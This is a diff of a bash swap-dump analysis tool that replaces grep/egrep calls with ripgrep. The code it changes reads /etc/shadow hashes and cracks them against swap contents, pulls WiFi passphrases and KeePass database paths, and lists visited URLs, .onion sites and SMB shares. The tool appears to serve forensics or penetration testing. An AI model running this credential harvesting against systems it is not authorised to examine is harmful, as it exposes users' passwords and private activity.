@@ -117,7 +117,7 @@ function dig_unix_passwd () {
 
     SHADOWHASHES="$(cut -d':' -f 2 ${TARGET_ROOT_DIR}etc/shadow | rg '^\$.\$')"
     while read -r thishash; do
-        USER="$(grep "${thishash}" ${TARGET_ROOT_DIR}etc/shadow | cut -d':' -f 1)"
+        USER="$(rg "${thishash}" ${TARGET_ROOT_DIR}etc/shadow | cut -d':' -f 1)"
         [ $VERBOSE ] && out "   [-] Digging for hash: $thishash  ($USER) ..."
         DUMP=`rg -C50 "$thishash" "$swap_dump_path";rg -C30 "_pammodutil_getpwnam" "$swap_dump_path";rg -A1 "^sudo " "$swap_dump_path";rg -C5 "gdm-password" "$swap_dump_path"`
         CTYPE="$(echo "$thishash" | cut -c-3)"
@@ -155,7 +155,7 @@ function dig_unix_passwd () {
                 CRYPT="\"$SAFE\", \"$CTYPE$SHADOWSALT\""
                 if [[ $(python2 -c "import crypt; print crypt.crypt($CRYPT)") == "$thishash" ]]; then
                     #Find which user's password it is (useful if used more than once!)
-                    USER="$(grep "${thishash}" ${TARGET_ROOT_DIR}etc/shadow | cut -d':' -f 1)"
+                    USER="$(rg "${thishash}" ${TARGET_ROOT_DIR}etc/shadow | cut -d':' -f 1)"
                     out "   -> $USER:$line"
                     passwordList=("${passwordList[@]}" "$line")
                     break
@@ -311,7 +311,7 @@ function dig_wifi_info () {
     blue " ==== WiFi ==="
     out
     out " [+] Looking for wifi access points..."
-    wifiNetworks=`rg -C 10 "Auto " "$swap_dump_path" | rg -C 10 wireless | rg "Auto " | grep -v "NetworkManager" | cut -d " " -f 2,3,4 | sort | uniq`
+    wifiNetworks=`rg -C 10 "Auto " "$swap_dump_path" | rg -C 10 wireless | rg "Auto " | rg -v "NetworkManager" | cut -d " " -f 2,3,4 | sort | uniq`
     out "   [-] Potential wifi network list this computer accessed to:"
     OLDIFS=$IFS; IFS=$'\n';
     for accesspoint in $wifiNetworks
@@ -321,7 +321,7 @@ function dig_wifi_info () {
     IFS=$OLDIFS
     out
     out " [+] Looking for potential Wifi passwords...."
-    wifiPasswords1=`rg -C 10 "Auto " "$swap_dump_path" | rg -A2 wpa-psk | egrep -v "wpa|addresses|NetworkManager|Auto|wireless|--|NMSetting" | sort | uniq`
+    wifiPasswords1=`rg -C 10 "Auto " "$swap_dump_path" | rg -A2 wpa-psk | rg -v "wpa|addresses|NetworkManager|Auto|wireless|--|NMSetting" | sort | uniq`
     out "   [-] Potential wifi password list (use them to crack above networks)"
     OLDIFS=$IFS; IFS=$'\n';
     for password in $wifiPasswords1
@@ -354,7 +354,7 @@ function dig_keepass () {
         out
         out " [+] Keepass detected!"
         out "   [-] Looking for KeePass DB name..."
-        keepassDb=`grep -m1 ".*/.*\.kdb.$" "$swap_dump_path" `
+        keepassDb=`rg -m1 ".*/.*\.kdb.$" "$swap_dump_path" `
         if [ -n  "$keepassDb" ]
         then
             out "   -> Found at: $keepassDb"
@@ -375,7 +375,7 @@ function dig_history () {
     out
     out " [+] TOP 30 HTTP/HTTPS URLs (domains only)"
     OLDIFS=$IFS; IFS=$'\n';
-    for entry in `egrep -o 'https?://[-A-Za-z0-9\+&@#%?=~_|!:,.;]+' "$swap_dump_path" | sort | uniq -cd | sort -k1,1nr | head -n 30`
+    for entry in `rg -o 'https?://[-A-Za-z0-9\+&@#%?=~_|!:,.;]+' "$swap_dump_path" | sort | uniq -cd | sort -k1,1nr | head -n 30`
     do
         out "   -> $entry"
     done
@@ -384,7 +384,7 @@ function dig_history () {
     out
     out " [+] TOP 30 FTP URLs"
     OLDIFS=$IFS; IFS=$'\n';
-    for entry in `egrep -o 'ftp://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]' "$swap_dump_path" | sort | uniq -c | sort -k1,1nr | head -n 30`
+    for entry in `rg -o 'ftp://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]' "$swap_dump_path" | sort | uniq -c | sort -k1,1nr | head -n 30`
     do
         out "   -> $entry"
     done
@@ -393,7 +393,7 @@ function dig_history () {
     out
     out " [+] TOP 30 .onion urls"
     OLDIFS=$IFS; IFS=$'\n';
-    for entry in `egrep -o 'https?://[-A-Za-z0-9\+&@#%?=~_|!:,.;]*\.onion/*[-A-Za-z0-9\+&@#/%=~_|]*'  "$swap_dump_path" | sort | uniq -c | sort -k1,1nr | head -n 30`
+    for entry in `rg -o 'https?://[-A-Za-z0-9\+&@#%?=~_|!:,.;]*\.onion/*[-A-Za-z0-9\+&@#/%=~_|]*'  "$swap_dump_path" | sort | uniq -c | sort -k1,1nr | head -n 30`
     do
         out "   -> $entry"
     done
@@ -402,7 +402,7 @@ function dig_history () {
     out
     out " [+] TOP 30 files"
     OLDIFS=$IFS; IFS=$'\n';
-    for entry in `egrep -o 'file://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]' "$swap_dump_path" | sort | uniq -cd | sort -k1,1nr | head -n 30`
+    for entry in `rg -o 'file://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]' "$swap_dump_path" | sort | uniq -cd | sort -k1,1nr | head -n 30`
     do
         out "   -> $entry"
     done
@@ -411,7 +411,7 @@ function dig_history () {
     out
     out " [+] TOP 30 smb shares"
     OLDIFS=$IFS; IFS=$'\n';
-    for entry in `egrep -o 'smb://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]' "$swap_dump_path" | sort | uniq -cd | sort -k1,1nr | head -n 30`
+    for entry in `rg -o 'smb://[-A-Za-z0-9\+&@#/%?=~_|!:,.;]*[-A-Za-z0-9\+&@#/%=~_|]' "$swap_dump_path" | sort | uniq -cd | sort -k1,1nr | head -n 30`
     do
         out "   -> $entry"
     done
@@ -420,7 +420,7 @@ function dig_history () {
     out
     out " [+] TOP 30 IP addresses (lots of false positives, ex. file versions)"
     OLDIFS=$IFS; IFS=$'\n';
-    for entry in `grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" swap_dump.txt | sort | uniq -c | sort -k1,1nr | head -n 30`
+    for entry in `rg -o "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" swap_dump.txt | sort | uniq -c | sort -k1,1nr | head -n 30`
     do
         out "   -> $entry"
     done
@@ -460,7 +460,7 @@ function guessing () {
     OLDIFS=$IFS; IFS=$'\n';
     for passwd in ${passwordList[*]}
     do
-        DUMP=`rg -C5 "$passwd" "$swap_dump_path" | egrep -vi "=|;|mail|session|nsI|login|number|desktop|<|/|\.com|--"` # We also remove special char responsible for too much false positive
+        DUMP=`rg -C5 "$passwd" "$swap_dump_path" | rg -vi "=|;|mail|session|nsI|login|number|desktop|<|/|\.com|--"` # We also remove special char responsible for too much false positive
         # Search for other words near password
         while read -r line; do
             passwdSize=`echo "$passwd" | wc -c`
@@ -470,7 +470,7 @@ function guessing () {
             re='^[0-9]+$'
             if [[ $passwdSizeMin =~ $re ]] && [[ $lineSize =~ $re ]] && [ "$lineSize" -lt "$passwdSizeMax" ] && [ "$lineSize" -gt "$passwdSizeMin" ]
             then
-                occurence=`grep -c "$line" "$swap_dump_path" 2>/dev/null`
+                occurence=`rg -c "$line" "$swap_dump_path" 2>/dev/null`
                 if [ $occurence -gt 0 ]
                 then
                     [ $VERBOSE ] && out "  [-] Potential password: $line"
@@ -493,7 +493,7 @@ function guessing () {
     do
         # Add it to password list
         passwordList=("${passwordList[@]}" "$passwd")
-        DUMP=`rg -C5 "$passwd" "$swap_dump_path" | egrep -vi "=|;|${passwd}|mail|session|nsI|login|number|desktop|<|/|,|\.com|--"` # We also remove special char responsibl for too much false positive and word itself
+        DUMP=`rg -C5 "$passwd" "$swap_dump_path" | rg -vi "=|;|${passwd}|mail|session|nsI|login|number|desktop|<|/|,|\.com|--"` # We also remove special char responsibl for too much false positive and word itself
         # Search for other words near password
         while read -r line; do
             passwdSize=`echo $passwd| wc -c`
@@ -502,7 +502,7 @@ function guessing () {
             lineSize=`echo $line | wc -c`
             if [[ $passwdSizeMin =~ $re ]] && [[ $lineSize =~ $re ]] && [ $lineSize -lt $passwdSizeMax ] && [ $lineSize -gt $passwdSizeMin ]
             then
-                occurence=`grep -c "$line" "$swap_dump_path" 2>/dev/null`
+                occurence=`rg -c "$line" "$swap_dump_path" 2>/dev/null`
                 if [ $occurence -gt 1 ]
                 then
                     [ $VERBOSE ] && out "  [-] Potential password: $line"
@@ -593,7 +593,7 @@ function swap_search () {
     out " [+] ${TARGET_ROOT_DIR}etc/fstab swap files:"
     swap=`cat ${TARGET_ROOT_DIR}etc/fstab | rg swap | cut -d " " -f 1`
     isSwap "$swap"  && out "   -> $swap"
-    swap=`cat ${TARGET_ROOT_DIR}etc/fstab | rg swap -m 1 | cut -d " " -f 5`
+    swap=`cat ${TARGET_ROOT_DIR}etc/fstab | rg swap -m1 | cut -d " " -f 5`
     isSwap "$swap"  && out "   -> $swap"
     out " [+] Looking for all available swap device files (will take some time):"
     OLDIFS=$IFS; IFS=$'\n';
